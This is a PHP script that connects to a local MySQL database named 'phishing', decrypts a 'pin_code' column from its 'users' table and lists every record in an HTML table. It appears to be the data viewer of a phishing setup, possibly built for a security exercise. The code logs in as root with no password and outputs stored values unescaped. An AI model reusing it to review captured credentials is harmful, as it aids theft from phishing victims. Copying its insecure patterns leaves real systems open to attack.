<?php
	
	function createBasicHeader($title, $charset="windows-1255", $direction="ltr", $background="", $bodyStyleStr="",
    $metaTagName="", $metaTagContent="", $cssFilesToIncludeArr="")
    {
        if($bodyStyleStr != "")
        	$bodyStyleStr = "style=\"".$bodyStyleStr."\"";
        
        if($background != "")
        	$background = "bgcolor=\"".$background."\"";
        	
        if($direction == "")
        	$direction = "ltr";
        
        echo "<html dir=".$direction.">
		<head>
		<meta http-equiv=\"Content-Type\" content=\"text/html; charset=$charset\" />
		<meta name=\"$metaTagName\" content=\"$metaTagContent\">";
		
		if($cssFilesToIncludeArr != "")
			addCSSFilesReferences($cssFilesToIncludeArr);
			
		echo "<title>$title</title>
		</head>
		<body ".$background." ".$bodyStyleStr.">";
    }
	
	function createBasicFooter()
	{
        echo "</body></html>";
    }
	
	function generateATableWithDecryptedData($sqlResult, $publicPEMKey, $HeaderOfHTMLtoWrapDataIn, $FooterOfHTMLtoWrapDataIn)
	{
		echo "<table width='100%'><tr>";
	 
		if (mysqli_num_rows($sqlResult) > 0)
		{
			//loop thru the field names to print the correct headers
			$i = 0;
			  
			while ($i < mysqli_num_fields($sqlResult))
			{
				$colObj = mysqli_fetch_field_direct($sqlResult, $i);                            
				$col = $colObj->name;
				
				if($col == "pin_code")
				{
					$pin_code_index = $i;
				}
				
				echo "<th>". $col . "</th>";
				$i++;
			}
			echo "</tr>";

			while ($row = mysqli_fetch_array($sqlResult, MYSQLI_ASSOC))
			{
			  $i = 0;
			  echo "<tr>";
			  
			  foreach ($row as $data)
			  {
				if($i == $pin_code_index && !strpos($data, "#####"))
				{
					$decrypted_data = decrypt_RSA($publicPEMKey, $data);
					
					echo "<td align='center'>". $HeaderOfHTMLtoWrapDataIn.$decrypted_data.$FooterOfHTMLtoWrapDataIn. "</td>";
				}
				else
				{
					echo "<td align='center'>". $HeaderOfHTMLtoWrapDataIn.$data.$FooterOfHTMLtoWrapDataIn. "</td>";
				}
				
				$i++;
			  }
			}
		}
		else
		{
			echo "<tr><td colspan='" . ($i+1) . "'>No Results found!</td></tr>";
		}
		echo "</table>";
	}

	include_once("../x509.php");
	
	$publicPEMKey = "-----BEGIN CERTIFICATE-----\r\nMIIEITCCAwmgAwIBAgIBATANBgkqhkiG9w0BAQsFADBtMQswCQYDVQQGEwJJTDELMAkGA1UECAwCU1QxCjAIBgNVBAcMAUwxCjAIBgNVBAoMAU8xCzAJBgNVBAsMAk9VMSwwKgYDVQQDDCNPIFN1Ym9yZGluYXRlIENlcnRpZmljYXRlIEF1dGhvcml0eTAeFw0yMDEyMjExNTExMDNaFw0yMjEyMjExNTExMDNaMFAxCzAJBgNVBAYTAklMMQswCQYDVQQIDAJTVDEKMAgGA1UEBwwBTDEKMAgGA1UECgwBTzELMAkGA1UECwwCT1UxDzANBgNVBAMMBmFwcHNlYzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAO5mY1hgj70NajxfjCAhLCKyl79iEZRhIpYGMs5NJbqhAN2xWQKbQgDeLZv5vENio7VIHPN4qjFPqGweoDSs7DLpx4lK+UxUl4MX0ZXojE+4lpW8gyZsAqfZrvwd8xX79+Hck5epmHQUNrZX/sYxxyztqvnQmZENfmX/OWbHWdZUDZ/7/Jy43l+w0N0+fkS5fxKRiPqfqHbI0cpaQz0f67Biz4uMgyZPCWqxXpCpyTkQ9xcVhEa3nNSSkPQ6TiJNQZtPMxEC69Csq3A2Alc3LHHxV4dicei5mquaEdEbEMhO1O1PW/99CbIZGTMaEDO6SXsyQd4h0fnyRw5bM7Mooz8CAwEAAaOB6DCB5TAOBgNVHQ8BAf8EBAMCB4AwCQYDVR0TBAIwADATBgNVHSUEDDAKBggrBgEFBQcDAjAdBgNVHQ4EFgQUi90psFlO5gBK5tJYG9MMbPXiFfUwHwYDVR0jBBgwFoAUfAFCROeq+wqKDky7XoXzn9xAkTowPgYIKwYBBQUHAQEEMjAwMC4GCCsGAQUFBzAChiJodHRwOi8vbXlEb21haW4ub3JnL2NhL215U3ViQ0EuY3J0MDMGA1UdHwQsMCowKKAmoCSGImh0dHA6Ly9teURvbWFpbi5vcmcvY2EvbXlTdWJDQS5jcmwwDQYJKoZIhvcNAQELBQADggEBAMHmTGgPhBsvFv5b+xERUbeGlKVFbMDU79EWnJhPUOylz71e4W0clNDC03IiYuGmRaKLUodrJRKKsYgmmtU/3tRZ/SxGhBO/wVSS8tJSbofa17vN7TtxyvLpXtTky1Yo0EBtOVfKNYOAfVLaLflJf2Vd9WpUy4dSBBxxIWjg2l1K2PQsNLPMDgmm43NujGFKD7BA9BYC8WuM5A5qXx4/gqVv2BMO4AXjeWwvRF2uqkKsvq1oeQT8keJxUfr4lQeVkU+6hH6yMKo51Fr71d7IwjtwsKVrViezLPLuFUs5IYeI/lG4guphxzb1hL9Ap0nTk7Vay4+UfQBI31qd+cfctkE=\r\n-----END CERTIFICATE-----";
	
	$conn = new mysqli ('localhost','root', '', 'phishing') or die("unable to connect");	
	mysqli_set_charset($conn, "utf8");
	
	
	createBasicHeader("Data Decoder", "utf-8", "rtl");
	
	
	$result = mysqli_query($conn, "SELECT * FROM users");
		
	if (!$result)
		echo('<BR>Invalid query: ' . mysqli_error());
	else
	{
		generateATableWithDecryptedData($result, $publicPEMKey, "", "");
		
		@mysqli_free_result($result);
	}
	
	createBasicFooter();
?>